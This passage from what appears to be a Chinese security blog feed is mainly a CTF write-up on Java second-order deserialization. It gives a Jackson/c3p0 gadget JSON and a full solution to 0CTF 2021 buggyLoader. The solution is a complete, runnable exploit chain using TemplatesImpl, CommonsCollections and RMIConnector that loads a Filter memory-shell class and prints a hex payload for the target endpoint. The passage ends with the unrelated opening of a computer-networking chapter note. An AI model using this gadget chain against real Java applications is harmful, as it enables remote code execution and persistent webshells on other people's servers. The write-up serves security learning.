<span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var0));</span><br><span class="line">        <span class="keyword">return</span> var1.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到调用了原生<code>readObject()</code>，为二次反序列化的起点</p><p>所以第一次反序列化的终点就是<code>setUpPropertyListeners()</code>，另外，JSON反序列化一般是先创建空对象再逐一赋值，这其中就涉及到setter方法的调用，当反序列化过程尝试修改字段值时，就会触发监听器的行为，该类的<code>setUpPropertyListeners()</code>继承自父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> PropertyVetoException</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="built_in">this</span>.userOverridesAsString;</span><br><span class="line"><span class="keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )</span><br><span class="line">vcs.fireVetoableChange( <span class="string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );</span><br><span class="line"><span class="built_in">this</span>.userOverridesAsString = userOverridesAsString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的序列化对象</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap&#123;HEX_STRING&#125;;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>测试Poc，尝试二次反序列化一个Map</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@class\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740015757365724f76657272696465734173537472696e67740015486578417363696953657269616c697a65644d617078;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping(</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL,</span><br><span class="line">                JsonTypeInfo.As.PROPERTY</span><br><span class="line">        );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> mapper.readValue(json, Object.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现是成功的</p><p><img src="/img/post/image-20260202142418553.png" alt="image-20260202142418553"></p><br/><h2 id="引例：-0CTF-2021-buggyLoader"><a href="#引例：-0CTF-2021-buggyLoader" class="headerlink" title="引例：[0CTF 2021] buggyLoader"></a>引例：[0CTF 2021] buggyLoader</h2><p>docker镜像：<a href="https://github.com/BabyTeam1024/0ctf_buggyLoader/tree/main">BabyTeam1024&#x2F;0ctf_buggyLoader</a></p><p>查看源码，<code>/basic</code>路由接收<code>data</code>参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> objectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;SJTU&quot;</span>) &amp;&amp; year == <span class="number">1896</span>) &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处反序列化统一使用自定义的输入流的方法<code>MyObjectInputStream.readObject()</code>，翻看源码得到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">        URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">        <span class="built_in">this</span>.classLoader = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="built_in">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是限制的地方，由于使用<code>URLClassLoader.loadClass()</code>，数组类的加载受到了限制，于是尝试通过<code>RmiConnector</code>进行二次反序列化</p><p>源码用了CC的依赖，先把后半段的逻辑写上，这里用Filter内存马</p><p>后半段我把CC5改成类加载逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\UniJava\\target\\classes\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templates, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazzz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazzz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>定义的Base64编码和16进制转码方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">objectToHex</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">1896</span>);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            hex.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  hex.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>前面是<code>RmiConnector</code>的逻辑，最后输出</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">Base64encode</span> <span class="operator">=</span> serialize(badAttributeValueExpException);</span><br><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">urlPath</span> <span class="operator">=</span> jmxServiceURL.getClass().getDeclaredField(<span class="string">&quot;urlPath&quot;</span>);</span><br><span class="line">urlPath.setAccessible(<span class="literal">true</span>);</span><br><span class="line">urlPath.set(jmxServiceURL, <span class="string">&quot;/stub/&quot;</span>+Base64encode);</span><br><span class="line">RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, invokerTransformer1);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),rmiConnector);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">hashSet.add(tiedMapEntry2);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazzzz</span> <span class="operator">=</span> tiedMapEntry2.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">map2</span> <span class="operator">=</span> clazzzz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">map2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">map2.set(tiedMapEntry2, lazyMap2);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> objectToHex(hashSet);</span><br><span class="line">System.out.println(hex);</span><br></pre></td></tr></table></figure><p>全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\UniJava\\target\\classes\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazzz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazzz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">Base64encode</span> <span class="operator">=</span> serialize(badAttributeValueExpException);</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlPath</span> <span class="operator">=</span> jmxServiceURL.getClass().getDeclaredField(<span class="string">&quot;urlPath&quot;</span>);</span><br><span class="line">        urlPath.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlPath.set(jmxServiceURL, <span class="string">&quot;/stub/&quot;</span>+Base64encode);</span><br><span class="line">        RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, invokerTransformer1);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry2);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazzzz</span> <span class="operator">=</span> tiedMapEntry2.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map2</span> <span class="operator">=</span> clazzzz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map2.set(tiedMapEntry2, lazyMap2);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> objectToHex(hashSet);</span><br><span class="line">        System.out.println(hex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">objectToHex</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">1896</span>);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            hex.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  hex.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行获得payload，注入数据</p><p><img src="/img/post/image-20260202154242322.png" alt="image-20260202154242322"></p><p>docker后台显示成功</p><p><img src="/img/post/image-20260202154315719.png" alt="image-20260202154315719"></p><p>获取flag</p><p><img src="/img/post/image-20260202154355716.png" alt="image-20260202154355716"></p><p>很有启发性的一道题，虽然经过五年但还是学习二次反序列化很好资料</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第一章</title>
      <link href="/2026/01/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
      <url>/2026/01/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络·第一章"><a href="#计算机网络·第一章" class="headerlink" title="计算机网络·第一章"></a>计算机网络·第一章</h1><h2 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h2><p>互联网是由多个计算机网络组成的一个大网，是”网络的网络“，因而也称作网际。互联网用于为分布式的资源提供连接，可以视为一个基础设施，我们视应用进程以下的部分都为基础设施。网络的基本组成是<strong>节点</strong>和<strong>链路</strong>，在互联网中，节点则是一个个局域网</p><p>节点有<strong>主机节点</strong>和<strong>数据交换节点</strong>，流量通过一次次数据交换节点的转发到达目标主机节点。数据交换节点有交换机、路由器等。绘制网络拓扑图时主机节点一般用方块表示，数据交换节点一般用圆表示，但是也不是很严格</p><p>对于链路，主机连节点接到数据交换节点，这样的链路称作接<strong>入网链路</strong>，而数据交换节点之间的链路称作<strong>主干链路</strong></p><p>协议用于控制发送、接收消息，规范数据的传输格式、方法，如TCP、IP、HTTP、PPP</p><p>互联网可以被分为网络边缘、网路核心和接入网、物理媒体</p><p><img src="/img/post/1680081-20230922164745993-89304658.png" alt="1680081-20230922164745993-89304658"></p><br/><h2 id="网络边缘Edge"><a href="#网络边缘Edge" class="headerlink" title="网络边缘Edge"></a>网络边缘Edge</h2><p>网络边缘系统主要由主机、应用程序组成，两个主机节点想要建立连接，流量都必须通过核心部分进行多次转发到达目标主机</p><h3 id="客户端-服务器模式"><a href="#客户端-服务器模式" class="headerlink" title="客户端-服务器模式"></a>客户端-服务器模式</h3><p>该模式下，所有的资源存储在服务器端，客户端只有向服务器发送请求才能获取资源，服务器是该模式下的主体。该模式的拓展性较差，在服务端的处理能力接近阈值时会直接崩溃</p><h3 id="对等模式"><a href="#对等模式" class="headerlink" title="对等模式"></a>对等模式</h3><p>又称作<strong>P2P模式</strong>，该模式下可以没有专门的服务器，每一个节点既是客户端也是服务器。该模式下，资源是分布式的，每个节点都持有资源的一部分，所以当客户端增多时，服务端也在增加，在应对较大规模的文件分发效时率很高</p><br/><h2 id="网络核心Core"><a href="#网络核心Core" class="headerlink" title="网络核心Core"></a>网络核心Core</h2><p>网络核心主要是路由器组成的网状网络，是进行流量转发的核心，进行数据交换主要有两种方式</p><h3 id="电路交换Circuit-Switching"><a href="#电路交换Circuit-Switching" class="headerlink" title="电路交换Circuit Switching"></a>电路交换Circuit 